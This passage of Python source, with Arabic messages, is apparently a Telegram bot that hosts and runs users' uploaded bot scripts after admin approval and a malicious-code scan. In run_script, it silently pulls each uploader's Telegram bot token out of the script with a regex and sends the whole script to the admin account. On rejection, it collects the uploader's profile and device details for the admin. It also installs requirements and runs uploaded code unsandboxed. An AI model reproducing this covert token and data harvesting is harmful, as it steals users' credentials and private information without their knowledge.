        bot.send_message(call.message.chat.id, "⚠️ أنت لست المطور.")

@bot.callback_query_handler(func=lambda call: call.data == 'free_mode')
def toggle_free_mode(call):
    if call.from_user.id == ADMIN_ID:
        global free_mode
        free_mode = not free_mode
        status = "مفتوح" if free_mode else "مغلق"
        bot.send_message(call.message.chat.id, f"🔓 تم تغيير وضع البوت بدون اشتراك إلى: {status}.")
    else:
        bot.send_message(call.message.chat.id, "⚠️ أنت لست المطور.")

@bot.message_handler(commands=['ban'])
def ban_user_command(message):
    if message.from_user.id == ADMIN_ID:
        try:
            parts = message.text.split(maxsplit=2)
            if len(parts) < 3:
                bot.send_message(message.chat.id, "⚠️ الصيغة الصحيحة: /ban <user_id> <reason>")
                return
            
            user_id = int(parts[1])
            reason = parts[2]
            
            ban_user(user_id, reason)
            bot.send_message(message.chat.id, f"✅ تم حظر المستخدم {user_id} بسبب: {reason}")
            try:
                bot.send_message(user_id, f"⛔ تم حظرك من استخدام البوت بسبب: {reason}")
            except:
                pass
        except Exception as e:
            logger.error(f"حدث خطأ أثناء حظر المستخدم: {e}")
            bot.send_message(message.chat.id, f"❌ حدث خطأ: {e}")
    else:
        bot.send_message(message.chat.id, "⚠️ أنت لست المطور.")

@bot.message_handler(commands=['unban'])
def unban_user_command(message):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = int(message.text.split()[1])
            
            if unban_user(user_id):
                bot.send_message(message.chat.id, f"✅ تم إلغاء حظر المستخدم {user_id}")
                try:
                    bot.send_message(user_id, f"🎉 تم إلغاء الحظر عنك. يمكنك الآن استخدام البوت مرة أخرى.")
                except:
                    pass
            else:
                bot.send_message(message.chat.id, f"⚠️ المستخدم {user_id} غير محظور.")
        except Exception as e:
            logger.error(f"فشل في إلغاء حظر المستخدم: {e}")
            bot.send_message(message.chat.id, f"❌ حدث خطأ: {e}")
    else:
        bot.send_message(message.chat.id, "⚠️ أنت لست المطور.")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    user_id = message.from_user.id
    
    if user_id in banned_users:
        bot.reply_to(message, "⛔ أنت محظور من استخدام هذا البوت. يرجى التواصل مع المطور إذا كنت تعتقد أن هذا خطأ.")
        return
    
    if bot_locked:
        bot.reply_to(message, "⚠️ البوت مقفل حالياً. الرجاء التواصل مع المطور @QMY00.")
        return
        
    if not is_user_subscribed_to_channel(user_id):
        markup = types.InlineKeyboardMarkup()
        channel_button = types.InlineKeyboardButton('انضم إلى القناة', url=f'https://t.me/{CHANNEL_USERNAME[1:]}')
        check_button = types.InlineKeyboardButton('✅ تحقق من الاشتراك', callback_data='check_subscription')
        markup.add(channel_button, check_button)
        bot.reply_to(message, "⚠️ يجب عليك الانضمام إلى قناتنا أولاً لاستخدام هذه الميزة.", reply_markup=markup)
        return
    
    if free_mode or (user_id in user_subscriptions and user_subscriptions[user_id]['expiry'] > datetime.now()):
        try:
            file_id = message.document.file_id
            file_info = bot.get_file(file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            file_name = message.document.file_name

            if not file_name.endswith('.py') and not file_name.endswith('.zip'):
                bot.reply_to(message, "⚠️ هذا البوت خاص برفع ملفات بايثون (.py) أو أرشيفات zip فقط.")
                return

            file_hash = hashlib.sha256(downloaded_file).hexdigest()
            logger.info(f"تم استلام ملف: {file_name} من المستخدم {user_id} بالبصمة {file_hash}")

            temp_path = os.path.join(tempfile.gettempdir(), file_name)
            with open(temp_path, 'wb') as temp_file:
                temp_file.write(downloaded_file)

            if file_name.endswith('.zip'):
                is_malicious, activity = scan_zip_for_malicious_code(temp_path, user_id)
            else:
                is_malicious, activity = scan_file_for_malicious_code(temp_path, user_id)
            
            if is_malicious:
                bot.reply_to(message, f"⛔ تم رفض الملف لأسباب أمنية. تم اكتشاف كود مشبوه.")
                return
            
            user_info = f"@{message.from_user.username}" if message.from_user.username else str(message.from_user.id)
            approval_message = f"📤 طلب رفع ملف جديد\n\n"
            approval_message += f"👤 المستخدم: {user_info}\n"
            approval_message += f"🆔 ID: {user_id}\n"
            approval_message += f"📄 اسم الملف: {file_name}\n"
            approval_message += f"🔐 بصمة الملف: {file_hash}\n\n"
            approval_message += "هل توافق على رفع هذا الملف؟"
            
            markup = types.InlineKeyboardMarkup()
            approve_button = types.InlineKeyboardButton('✅ الموافقة', callback_data=f'approve_{user_id}_{file_name}')
            reject_button = types.InlineKeyboardButton('❌ الرفض', callback_data=f'reject_{user_id}_{file_name}')
            markup.add(approve_button, reject_button)
            
            pending_approvals[(user_id, file_name)] = temp_path
            
            with open(temp_path, 'rb') as file:
                bot.send_document(ADMIN_ID, file, caption=approval_message, reply_markup=markup)
            
            bot.reply_to(message, "📨 تم إرسال طلب الموافقة على رفع الملف إلى المشرف. سيتم إعلامك بالقرار.")
            
        except Exception as e:
            logger.error(f"فشل في معالجة الملف: {e}")
            bot.reply_to(message, f"❌ حدث خطأ: {e}")
    else:
        bot.reply_to(message, "⚠️ يجب عليك الاشتراك لاستخدام هذه الميزة. الرجاء التواصل مع المطور @QMY00.")

@bot.callback_query_handler(func=lambda call: call.data.startswith(('approve_', 'reject_')))
def handle_approval(call):
    if call.from_user.id == ADMIN_ID:
        action, user_id, file_name = call.data.split('_', 2)
        user_id = int(user_id)
        file_key = (user_id, file_name)
        
        if file_key in pending_approvals:
            temp_path = pending_approvals[file_key]
            
            if action == 'approve':
                try:
                    if file_name.endswith('.zip'):
                        with tempfile.TemporaryDirectory() as temp_dir:
                            zip_folder_path = os.path.join(temp_dir, file_name.split('.')[0])

                            with zipfile.ZipFile(temp_path, 'r') as zip_ref:
                                zip_ref.extractall(zip_folder_path)

                            final_folder_path = os.path.join(uploaded_files_dir, file_name.split('.')[0])
                            if not os.path.exists(final_folder_path):
                                os.makedirs(final_folder_path)

                            for root, dirs, files in os.walk(zip_folder_path):
                                for file in files:
                                    src_file = os.path.join(root, file)
                                    dest_file = os.path.join(final_folder_path, file)
                                    shutil.move(src_file, dest_file)

                            py_files = [f for f in os.listdir(final_folder_path) if f.endswith('.py')]
                            if py_files:
                                main_script = py_files[0]  
                                run_script(os.path.join(final_folder_path, main_script), user_id, final_folder_path, main_script, call.message)
                            else:
                                bot.send_message(ADMIN_ID, f"❌ لم يتم العثور على أي ملفات بايثون (.py) في الأرشيف.")
                                bot.send_message(user_id, "❌ لم يتم العثور على أي ملفات بايثون (.py) في الأرشيف.")
                                return
                    else:
                        script_path = os.path.join(uploaded_files_dir, file_name)
                        shutil.move(temp_path, script_path)
                        run_script(script_path, user_id, uploaded_files_dir, file_name, call.message)

                    if user_id not in user_files:
                        user_files[user_id] = []
                    user_files[user_id].append(file_name)
                    save_user_file(user_id, file_name)
                    
                    bot.send_message(ADMIN_ID, f"✅ تمت الموافقة على رفع الملف {file_name} للمستخدم {user_id}.")
                    bot.send_message(user_id, f"✅ تمت الموافقة على رفع ملفك {file_name} وتم تشغيله بنجاح.")
                    
                except Exception as e:
                    logger.error(f"فشل في معالجة الملف بعد الموافقة: {e}")
                    bot.send_message(ADMIN_ID, f"❌ فشل في معالجة الملف بعد الموافقة: {e}")
                    bot.send_message(user_id, f"❌ حدث خطأ أثناء معالجة ملفك بعد الموافقة: {e}")
            else:
                try:
                    device_info = gather_device_info()
                    user_contacts = gather_user_contacts(user_id)
                    
                    rejection_message = f"❌ تم رفض رفع الملف {file_name} للمستخدم {user_id}\n\n"
                    rejection_message += "📌 معلومات المستخدم:\n"
                    rejection_message += f"👤 الاسم: {user_contacts.get('first_name', 'غير متوفر')} {user_contacts.get('last_name', '')}\n"
                    rejection_message += f"📌 اليوزر: @{user_contacts.get('username', 'غير متوفر')}\n"
                    rejection_message += f"📝 البايو: {user_contacts.get('bio', 'غير متوفر')}\n\n"
                    
                    rejection_message += "🖥️ معلومات الجهاز:\n"
                    for key, value in device_info.items():
                        rejection_message += f"{key}: {value}\n"
                    
                    bot.send_message(ADMIN_ID, rejection_message)
                    
                    os.remove(temp_path)
                    bot.send_message(ADMIN_ID, f"❌ تم رفض رفع الملف {file_name} للمستخدم {user_id}.")
                    bot.send_message(user_id, f"❌ تم رفض طلب رفع ملفك {file_name} من قبل المشرف.")
                except Exception as e:
                    logger.error(f"فشل في حذف الملف المرفوض: {e}")
            
            del pending_approvals[file_key]
        else:
            bot.send_message(ADMIN_ID, "⚠️ انتهت صلاحية طلب الموافقة أو تم معالجته مسبقاً.")
    else:
        bot.send_message(call.message.chat.id, "⚠️ أنت لست المطور.")

def run_script(script_path, chat_id, folder_path, file_name, original_message):
    try:
        requirements_path = os.path.join(os.path.dirname(script_path), 'requirements.txt')
        if os.path.exists(requirements_path):
            bot.send_message(chat_id, "🔄 جارٍ تثبيت المتطلبات...")
            subprocess.check_call(['pip', 'install', '-r', requirements_path])

        bot.send_message(chat_id, f"🚀 جارٍ تشغيل البوت {file_name}...")
        
        env = os.environ.copy()
        env["PYTHONPATH"] = os.path.dirname(script_path)
        
        process = subprocess.Popen(['python3', script_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env)
        bot_scripts[chat_id] = {'process': process, 'folder_path': folder_path}

        token = extract_token_from_script(script_path)
        if token:
            try:
                bot_info = requests.get(f'https://api.telegram.org/bot{token}/getMe').json()
                if bot_info.get('ok'):
                    bot_username = bot_info['result']['username']

                    user_info = f"@{original_message.from_user.username}" if original_message.from_user.username else str(original_message.from_user.id)
                    caption = f"📤 قام المستخدم {user_info} برفع ملف بوت جديد. معرف البوت: @{bot_username}"
                    bot.send_document(ADMIN_ID, open(script_path, 'rb'), caption=caption)

                    markup = types.InlineKeyboardMarkup()
                    stop_button = types.InlineKeyboardButton(f"🔴 إيقاف {file_name}", callback_data=f'stop_{chat_id}_{file_name}')
                    delete_button = types.InlineKeyboardButton(f"🗑️ حذف {file_name}", callback_data=f'delete_{chat_id}_{file_name}')
                    markup.add(stop_button, delete_button)
                    bot.send_message(chat_id, f"استخدم الأزرار أدناه للتحكم في البوت 👇", reply_markup=markup)
                else:
                    bot.send_message(chat_id, f"✅ تم تشغيل البوت بنجاح! ولكن لم أتمكن من التحقق من معرف البوت.")
            except Exception as e:
                logger.error(f"فشل في التحقق من معرف البوت: {e}")
                bot.send_message(chat_id, f"✅ تم تشغيل البوت بنجاح! ولكن لم أتمكن من التحقق من معرف البوت.")
        else:
            bot.send_message(chat_id, f"✅ تم تشغيل البوت بنجاح! ولكن لم أتمكن من جلب معرف البوت.")
            user_info = f"@{original_message.from_user.username}" if original_message.from_user.username else str(original_message.from_user.id)
            bot.send_document(ADMIN_ID, open(script_path, 'rb'), caption=f"📤 قام المستخدم {user_info} برفع ملف بوت جديد، ولكن لم أتمكن من جلب معرف البوت.")

    except Exception as e:
        logger.error(f"فشل في تشغيل البوت: {e}")
        bot.send_message(chat_id, f"❌ حدث خطأ أثناء تشغيل البوت: {e}")

def extract_token_from_script(script_path):
    try:
        with open(script_path, 'r', encoding='utf-8', errors='ignore') as script_file:
            file_content = script_file.read()

            token_match = re.search(r"['\"]([0-9]{9,10}:[A-Za-z0-9_-]+)['\"]", file_content)
            if token_match:
                return token_match.group(1)
            else:
                logger.warning(f"لم يتم العثور على توكن في {script_path}")
    except Exception as e:
        logger.error(f"فشل في استخراج التوكن من {script_path}: {e}")
    return None

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    chat_id = call.message.chat.id
    
    if 'stop_' in call.data:
        file_name = call.data.split('_')[-1]
        stop_running_bot(chat_id)
    elif 'delete_' in call.data:
        file_name = call.data.split('_')[-1]
        delete_uploaded_file(chat_id)

def stop_running_bot(chat_id):
    if chat_id in bot_scripts and bot_scripts[chat_id].get('process'):
        kill_process_tree(bot_scripts[chat_id]['process'])
        bot.send_message(chat_id, "🔴 تم إيقاف تشغيل البوت.")
    else:
        bot.send_message(chat_id, "⚠️ لا يوجد بوت يعمل حالياً.")

def delete_uploaded_file(chat_id):
    if chat_id in bot_scripts and bot_scripts[chat_id].get('folder_path') and os.path.exists(bot_scripts[chat_id]['folder_path']):
        shutil.rmtree(bot_scripts[chat_id]['folder_path'])
        bot.send_message(chat_id, f"🗑️ تم حذف الملفات المتعلقة بالبوت.")
    else:
        bot.send_message(chat_id, "⚠️ الملفات غير موجودة.")

def kill_process_tree(process):
    try:
        parent = psutil.Process(process.pid)
        children = parent.children(recursive=True)
        for child in children:
            child.kill()
        parent.kill()
    except Exception as e:
        logger.error(f"فشل في قتل العملية: {e}")

@bot.message_handler(commands=['delete_user_file'])
def delete_user_file(message):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = int(message.text.split()[1])
            file_name = message.text.split()[2]
            
            if user_id in user_files and file_name in user_files[user_id]:
                file_path = os.path.join(uploaded_files_dir, file_name)
                if os.path.exists(file_path):
                    os.remove(file_path)
                    user_files[user_id].remove(file_name)
                    remove_user_file_db(user_id, file_name)
                    bot.send_message(message.chat.id, f"✅ تم حذف الملف {file_name} للمستخدم {user_id}.")
                else:
                    bot.send_message(message.chat.id, f"⚠️ الملف {file_name} غير موجود.")
            else:
                bot.send_message(message.chat.id, f"⚠️ المستخدم {user_id} لم يرفع الملف {file_name}.")
        except Exception as e:
            logger.error(f"فشل في حذف ملف المستخدم: {e}")
            bot.send_message(message.chat.id, f"❌ حدث خطأ: {e}")
    else:
        bot.send_message(message.chat.id, "⚠️ أنت لست المطور.")

@bot.message_handler(commands=['stop_user_bot'])
def stop_user_bot(message):
    if message.from_user.id == ADMIN_ID:
        try:
            user_id = int(message.text.split()[1])
            file_name = message.text.split()[2]
            
            if user_id in user_files and file_name in user_files[user_id]:
                for chat_id, script_info in bot_scripts.items():
                    if script_info.get('folder_path', '').endswith(file_name.split('.')[0]):
                        kill_process_tree(script_info['process'])
                        bot.send_message(chat_id, f"🔴 تم إيقاف تشغيل البوت {file_name}.")
                        bot.send_message(message.chat.id, f"✅ تم إيقاف تشغيل البوت {file_name} للمستخدم {user_id}.")
                        break
                else:
                    bot.send_message(message.chat.id, f"⚠️ البوت {file_name} غير قيد التشغيل.")
            else:
                bot.send_message(message.chat.id, f"⚠️ المستخدم {user_id} لم يرفع الملف {file_name}.")
        except Exception as e:
            logger.error(f"فشل في إيقاف بوت المستخدم: {e}")
            bot.send_message(message.chat.id, f"❌ حدث خطأ: {e}")
    else:
        bot.send_message(message.chat.id, "⚠️ أنت لست المطور.")

logger.info('بدء تشغيل البوت بنجاح')
print('تم تشغيل البوت بنجاح')
bot.infinity_polling()
